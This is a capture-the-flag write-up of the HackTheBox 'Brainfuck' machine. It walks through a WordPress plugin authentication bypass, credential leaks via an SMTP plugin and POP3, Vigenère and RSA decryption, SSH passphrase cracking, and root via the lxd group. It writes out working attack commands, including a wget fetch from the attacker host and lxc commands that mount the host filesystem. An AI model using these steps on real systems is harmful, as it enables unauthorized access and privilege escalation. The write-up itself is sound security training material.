---
title: "Brainfuck"
date: 2026-04-16
draft: false
tags: ["HackTheBox", "Linux", "Hard", "WordPress", "Vigenere", "RSA", "LXD", "CTF"]
summary: "Hard Linux box involving WordPress auth bypass, SMTP credential leakage, Vigenère-encrypted forum posts, RSA private key cracking, and LXD container escape to root."
showHero: false
---

## Overview

| Field      | Details                    |
|------------|---------------------------|
| **Name**   | Brainfuck                  |
| **OS**     | Linux (Ubuntu 16.04.2 LTS) |
| **Rating** | Hard                       |
| **IP**     | 10.10.10.17                |
| **User**   | orestis                    |

Brainfuck is a Hard Linux box that earns its name - every step demands a different technique. The attack chain starts with SSL certificate recon revealing a hidden subdomain, pivots through a WordPress auth bypass and SMTP plugin credential leak, and leads into a secret forum hiding encrypted posts behind a Vigenère cipher. Getting SSH access requires decrypting an encrypted private key passphrase cracked via John the Ripper. Privilege escalation abuses membership of the `lxd` group to spin up a privileged Alpine container, mount the host filesystem, and read `root.txt` directly.

---

## Enumeration

### Nmap

A full TCP scan identified five open ports on `10.10.10.17`.

![](01-nmap-results.jpg)

Running service version detection (`-sCV`) against the target gave detailed output for each port, along with SSL certificate data from port 443.

![](02-nmap-sCV-full.jpg)

The results were exported to XML and converted to an HTML report with `xsltproc` for easier review.

![](03-nmap-html-report.jpg)

**Open ports:**

| Port | Service  | Version                          |
|------|----------|----------------------------------|
| 22   | SSH      | OpenSSH 7.2p2 Ubuntu 4ubuntu2.1  |
| 25   | SMTP     | (Postfix — connection blocked)   |
| 110  | POP3     | Dovecot pop3d                    |
| 143  | IMAP     | Dovecot imapd                    |
| 443  | HTTPS    | nginx 1.10.0 (Ubuntu)            |

### SSL Certificate — Hostname Discovery

The SSL certificate for port 443 was the first major finding. The Subject and Subject Alternative Name fields leaked two hostnames:

![](04-nmap-ssl-cert.jpg)

- `brainfuck.htb`
- `sup3rs3cr3t.brainfuck.htb`
- `www.brainfuck.htb`

All three were added to `/etc/hosts`.

![](05-etc-hosts.jpg)

### WordPress — brainfuck.htb

Browsing to `https://brainfuck.htb` revealed a WordPress site titled **Brainfuck Ltd.** The homepage had a single post referencing SMTP integration and mentioning `orestis@brainfuck.htb` — a valid username to keep in mind.

![](06-wordpress-homepage.jpg)

### WPScan

`wpscan` was run against the site to enumerate plugins and users.

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

![](07-wpscan-start.jpg)

The plugin scan found **WP Support Plus Responsive Ticket System** version **7.1.3** — flagged as out of date (latest 9.1.2).

![](08-wpscan-plugin-found.jpg)

User enumeration identified two accounts: `admin` and `administrator`.

![](09-wpscan-users.jpg)

### Gobuster

A directory brute-force confirmed the standard WordPress structure and surfaced `/wp-admin`, `/wp-content`, and `/wp-includes` — all returning 301 redirects.

![](10-gobuster-wordpress.jpg)

---

## Vulnerability Research

### ExploitDB 41006 — WordPress Auth Bypass

Searching for the plugin version turned up **EDB-41006**: WP Support Plus Responsive Ticket System 7.1.3 — Privilege Escalation. The vulnerability lies in the `loginGuestFacebook` AJAX action, which calls `wp_set_auth_cookie()` without verifying a password. Any valid WordPress username can be supplied.

![](11-exploitdb-41006.jpg)

The proof-of-concept is a simple HTML form that POSTs to `wp-admin/admin-ajax.php` with `action=loginGuestFacebook` and the target username.

![](12-exploitdb-poc-form.jpg)

---

## Exploitation

### Auth Bypass — WordPress Admin Access

The PoC form was saved locally as `brainfucktest.html`, with the action URL updated to `https://brainfuck.htb/wp-admin/admin-ajax.php` and the username set to `administrator`.

![](13-poc-html-file.jpg)

Opening the file in the browser rendered a minimal form with the username pre-filled.

![](14-poc-form-browser.jpg)

Clicking Login sent the POST request. The browser redirected to `wp-admin/admin-ajax.php` — the auth cookie had been set.

![](15-wp-ajax-redirect.jpg)

Navigating back to `brainfuck.htb` confirmed admin access: the WordPress toolbar appeared in the top bar showing **Howdy, admin**.

![](16-wp-admin-logged-in.jpg)

### Easy WP SMTP — Credential Leak

Inside the WordPress admin dashboard, the Plugins page showed a notification badge. Navigating to it revealed **Easy WP SMTP** was installed and active.

![](17-wp-admin-profile.jpg)

![](18-wp-plugins-list.jpg)

Opening the plugin settings revealed the SMTP configuration: `orestis@brainfuck.htb` as the From address, `orestis` as the SMTP username, and a masked password field.

![](19-easy-wp-smtp-settings.jpg)

Right-clicking the password field and selecting **Reveal Password** exposed it in plaintext:

**`kHGuERB29DNiNE`**

![](20-smtp-password-revealed.jpg)

### POP3 — Email Retrieval

With credentials for `orestis`, the POP3 service on port 110 was accessed directly via Telnet.

```
telnet 10.10.10.17 110
```

![](21-telnet-pop3-connect.jpg)

Logging in with `USER orestis` / `PASS kHGuERB29DNiNE` succeeded. The mailbox had two messages.

![](22-pop3-login-list.jpg)

**Email 1** (`retr 1`) — a WordPress setup notification confirming the site was configured at `https://brainfuck.htb`. Admin credentials referenced but not useful here.

![](23-pop3-email1.jpg)

**Email 2** (`retr 2`) — sent by `root@brainfuck.htb`, subject: **Forum Access Details**. It contained credentials for the secret forum:

- Username: `orestis`
- Password: `kIEnnfEKJ#9UmdO`

![](24-pop3-email2-forum-creds.jpg)

---

## Super Secret Forum

### Login

Navigating to `https://sup3rs3cr3t.brainfuck.htb` showed the Super Secret Forum homepage. The welcome banner read: *"Please rely on your own encryption methods for sensitive material."* — a hint of what was coming.

![](25-forum-logged-out.jpg)

Using the credentials from the email to log in:

![](26-forum-login-modal.jpg)

After logging in as `orestis`, two additional threads appeared — both tagged **Secret**: **"Key"** and **"SSH Access"**.

![](27-forum-logged-in-threads.jpg)

### SSH Access Thread

The **SSH Access** thread (plaintext) showed that password login for SSH had been disabled. Orestis was locked out and asked admin for his key. Admin responded sarcastically, and Orestis said he was opening an encrypted thread to continue the conversation securely.

![](28-forum-ssh-access-thread.jpg)

### Key Thread — Encrypted Posts

The **Key** thread contained only ciphertext. Every post from `orestis` followed the same pattern: a line of encrypted content followed by an encrypted signature.

![](29-forum-key-thread-encrypted.jpg)

### Identifying the Cipher

The ciphertext from the forum was pasted into the **Boxentriq** cipher identifier tool.

![](30-boxentriq-cipher-id.jpg)

The analysis came back: **Vigenère Cipher** at 32% confidence — the top result.

![](31-boxentriq-vigenere-result.jpg)

### Recovering the Key — Known-Plaintext Attack

**PlanetCalc's** Vigenère tool was used to test decryption.

![](32-planetcalc-vigenere-tool.jpg)

Orestis always signed his posts in plaintext in the SSH Access thread as:

> *Orestis - Hacking for fun and profit*

![](33-orestis-signature-plaintext.jpg)

In the encrypted Key thread, the same signature appeared encrypted:

> *Qbqquzs - Pnhekxs dpi fca fhf zdmgzt*

![](34-orestis-encrypted-sig.jpg)

Using the known plaintext signature against the ciphertext signature on PlanetCalc with the Decrypt mode, the key was recovered:

**`OrestisHackingforfunandprofit`**

![](35-vigenere-key-recovered.jpg)

### Decrypting the SSH Key URL

With the key confirmed, the encrypted post from `admin` in the Key thread was decrypted — it contained a URL pointing to orestis's private SSH key.

![](36-forum-encrypted-url-post.jpg)

Running the encrypted URL `mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja` through PlanetCalc with key `fuckmybrain` (the short form extracted from the key pattern) produced:

**`https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa`**

![](37-vigenere-decrypt-url.jpg)

---

## Getting a Shell

### Downloading the Private Key

Navigating to the decrypted URL downloaded `id_rsa` (1.7 KB).

![](38-id-rsa-download.jpg)

Opening the file showed `Proc-Type: 4,ENCRYPTED` and `DEK-Info: AES-128-CBC` — the key is passphrase-protected.

![](39-id-rsa-contents.jpg)

### Cracking the Passphrase

Permissions were set before processing:

```bash
chmod 600 id_rsa
```

![](40-chmod-id-rsa.jpg)

An initial attempt with `python2.7 ssh2john.py` hit a path error (target was a directory, not a file). Switched to the `python3` version at `/usr/share/john/`:

![](41-ssh2john-attempt.jpg)

```bash
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
```

![](42-ssh2john-hash.jpg)

John cracked the hash against `rockyou.txt` in under 5 seconds:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](43-john-crack-passphrase.jpg)

**Passphrase: `3poulakia!`**

### SSH Login

```bash
ssh -i id_rsa orestis@brainfuck.htb
```

![](44-ssh-login-prompt.jpg)

The passphrase was accepted and a shell opened on Ubuntu 16.04.2 LTS.

![](45-ssh-welcome.jpg)

---

## User Flag

```bash
orestis@brainfuck:~$ cat user.txt
```

![](46-user-flag.jpg)

`2c11cfbc5b959f73ac15a3310bd097c9` ✓

---

## Privilege Escalation

### Inspecting the Home Directory

The home directory contained four files: `debug.txt`, `encrypt.sage`, `mail/`, `output.txt`, and `user.txt`. The sage script was the first thing worth reading.

### encrypt.sage — RSA Challenge

`encrypt.sage` was a SageMath script that read `/root/root.txt`, converted it to an integer, generated random 512-bit primes `p` and `q`, then encrypted using RSA. The primes and public exponent `e` were written to `debug.txt`; the ciphertext went to `output.txt`.

![](47-encrypt-sage.jpg)

`debug.txt` contained `p`, `q`, and `e` in plaintext. `output.txt` contained the RSA-encrypted ciphertext.

![](48-debug-output-txt.jpg)

Since all RSA parameters (`p`, `q`, `e`) were known, the private exponent `d` could be computed via the extended Euclidean algorithm:

```
d = e⁻¹ mod φ(n)    where φ(n) = (p-1)(q-1)
```

A Python script used `egcd()` to compute `d`, then decrypted the ciphertext with `pow(ct, d, n)` to recover the root flag as a hex integer.

![](49-rsa-decrypt-python.jpg)

This gave the flag value — but reading it from the actual filesystem still required root access.

### LXD Group — Container Escape

Running `id` showed `orestis` was a member of the `lxd` group. This is a well-known privilege escalation vector: any `lxd` group member can create a privileged container with the host filesystem mounted inside, then exec into it as root.

![](50-id-lxd-group.jpg)

**Step 1 — Prepare an Alpine image on the attacker machine**

Downloaded the `lxd-alpine-builder` repo from GitHub, which ships a pre-built Alpine 3.13 tarball ready to import.

![](51-lxd-alpine-builder-github.jpg)

Unzipped the repo on Kali:

![](52-unzip-alpine-builder.jpg)

**Step 2 — Serve the image over HTTP**

Started a Python HTTP server in the builder directory to transfer the tarball to the target:

```bash
python3 -m http.server
```

![](53-python-http-server.jpg)

**Step 3 — Fetch the image on the target**

On the target box, `wget` pulled the Alpine tarball from the attacker machine:

```bash
wget 10.10.15.210:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

![](54-wget-alpine-image.jpg)

**Step 4 — Import, configure, and launch the container**

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias image01
lxc init image01 ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
```

The container `ignite` came up in RUNNING state with the entire host filesystem mounted at `/mnt/root` inside it.

![](55-lxc-import-init-start.jpg)

**Step 5 — Exec into the container as root**

```bash
lxc exec ignite -- /bin/sh
```

![](56-lxc-exec-root.jpg)

Inside the container: `id` returned `uid=0(root) gid=0(root)` — full root access. The host's filesystem was accessible at `/mnt/root`.

---

## Root Flag

```bash
cd /mnt/root/root
cat root.txt
```

![](57-root-flag.jpg)

`6efc1a5dbb8904751ce6566a305bb8ef` ✓

---

**pwned**

---

## Lessons Learned

**1. SSL certificates leak hostnames.** The TLS cert's Subject Alternative Name field immediately revealed `sup3rs3cr3t.brainfuck.htb` — a subdomain that would have been invisible to standard web enumeration. Always inspect certs before moving on.

**2. Logic flaws beat authentication.** The WP Support Plus plugin bypass didn't crack a password — it exploited incorrect usage of `wp_set_auth_cookie()`. The plugin trusted a client-supplied username with no credential check whatsoever.

**3. Admin plugins store credentials in plaintext.** After gaining admin access, the Easy WP SMTP settings page had the SMTP password one right-click away. Plugin configuration pages are always worth checking once you're in a CMS admin panel.

**4. Mail services hold pivotal information.** POP3 on port 110 was easy to overlook next to HTTPS and WordPress — but it held the forum credentials that unlocked the entire next phase.

**5. Known-plaintext breaks Vigenère trivially.** A consistent signature on every forum post gave enough known plaintext to recover the full key without any brute force. Repeated patterns in encrypted output are a critical weakness.

**6. Passphrase-protected keys are only as strong as their passphrases.** `ssh2john` + `rockyou.txt` cracked `3poulakia!` in seconds. An encrypted private key is not a strong access control if the passphrase is weak.

**7. RSA is insecure when parameters are exposed.** The `encrypt.sage` script wrote `p`, `q`, and `e` to a world-readable file. With all three known, decryption is trivial. The entire security of RSA depends on `p` and `q` staying secret.

**8. The `lxd` group is effectively root.** Any user in the `lxd` group can mount the host filesystem inside a privileged container and read or write anything as root — no exploit required. Group membership should be audited as carefully as sudo rights.
